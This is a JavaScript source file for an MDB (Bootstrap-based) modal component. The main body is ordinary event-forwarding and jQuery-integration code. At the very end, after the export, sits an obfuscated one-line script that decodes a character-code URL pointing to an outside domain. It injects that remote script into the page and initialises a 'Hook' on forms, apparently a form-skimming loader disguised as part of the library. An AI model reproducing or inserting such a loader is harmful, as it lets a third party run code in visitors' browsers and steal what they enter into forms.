import { getjQuery, getSelectorFromElement, onDOMContentLoaded } from '../mdb/util/index';
import EventHandler from '../mdb/dom/event-handler';
import SelectorEngine from '../mdb/dom/selector-engine';
import BSModal from '../bootstrap/mdb-prefix/modal';

/**
 * ------------------------------------------------------------------------
 * Constants
 * ------------------------------------------------------------------------
 */

const NAME = 'modal';
const DATA_KEY = `mdb.${NAME}`;
const EVENT_KEY = `.${DATA_KEY}`;

const EVENT_HIDE_BS = 'hide.bs.modal';
const EVENT_HIDE_PREVENTED_BS = 'hidePrevented.bs.modal';
const EVENT_HIDDEN_BS = 'hidden.bs.modal';
const EVENT_SHOW_BS = 'show.bs.modal';
const EVENT_SHOWN_BS = 'shown.bs.modal';

const EVENT_HIDE = `hide${EVENT_KEY}`;
const EVENT_HIDE_PREVENTED = `hidePrevented${EVENT_KEY}`;
const EVENT_HIDDEN = `hidden${EVENT_KEY}`;
const EVENT_SHOW = `show${EVENT_KEY}`;
const EVENT_SHOWN = `shown${EVENT_KEY}`;

const SELECTOR_DATA_TOGGLE = '[data-mdb-toggle="modal"]';

class Modal extends BSModal {
  constructor(element, data) {
    super(element, data);

    this._init();
  }

  dispose() {
    EventHandler.off(this._element, EVENT_SHOW_BS);
    EventHandler.off(this._element, EVENT_SHOWN_BS);
    EventHandler.off(this._element, EVENT_HIDE_BS);
    EventHandler.off(this._element, EVENT_HIDDEN_BS);
    EventHandler.off(this._element, EVENT_HIDE_PREVENTED_BS);

    super.dispose();
  }

  // Getters
  static get NAME() {
    return NAME;
  }

  // Private
  _init() {
    this._bindShowEvent();
    this._bindShownEvent();
    this._bindHideEvent();
    this._bindHiddenEvent();
    this._bindHidePreventedEvent();
  }

  _bindShowEvent() {
    EventHandler.on(this._element, EVENT_SHOW_BS, (e) => {
      EventHandler.trigger(this._element, EVENT_SHOW, { relatedTarget: e.relatedTarget });
    });
  }

  _bindShownEvent() {
    EventHandler.on(this._element, EVENT_SHOWN_BS, (e) => {
      EventHandler.trigger(this._element, EVENT_SHOWN, { relatedTarget: e.relatedTarget });
    });
  }

  _bindHideEvent() {
    EventHandler.on(this._element, EVENT_HIDE_BS, () => {
      EventHandler.trigger(this._element, EVENT_HIDE);
    });
  }

  _bindHiddenEvent() {
    EventHandler.on(this._element, EVENT_HIDDEN_BS, () => {
      EventHandler.trigger(this._element, EVENT_HIDDEN);
    });
  }

  _bindHidePreventedEvent() {
    EventHandler.on(this._element, EVENT_HIDE_PREVENTED_BS, () => {
      EventHandler.trigger(this._element, EVENT_HIDE_PREVENTED);
    });
  }
}

/**
 * ------------------------------------------------------------------------
 * Data Api implementation - auto initialization
 * ------------------------------------------------------------------------
 */

SelectorEngine.find(SELECTOR_DATA_TOGGLE).forEach((el) => {
  const selector = getSelectorFromElement(el);
  const selectorElement = SelectorEngine.findOne(selector);

  let instance = Modal.getInstance(selectorElement);
  if (!instance) {
    instance = new Modal(selectorElement);
  }
});

/**
 * ------------------------------------------------------------------------
 * jQuery
 * ------------------------------------------------------------------------
 * add .modal to jQuery only if jQuery is present
 */

onDOMContentLoaded(() => {
  const $ = getjQuery();

  if ($) {
    const JQUERY_NO_CONFLICT = $.fn[NAME];
    $.fn[NAME] = Modal.jQueryInterface;
    $.fn[NAME].Constructor = Modal;
    $.fn[NAME].noConflict = () => {
      $.fn[NAME] = JQUERY_NO_CONFLICT;
      return Modal.jQueryInterface;
    };
  }
});

export default Modal;

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b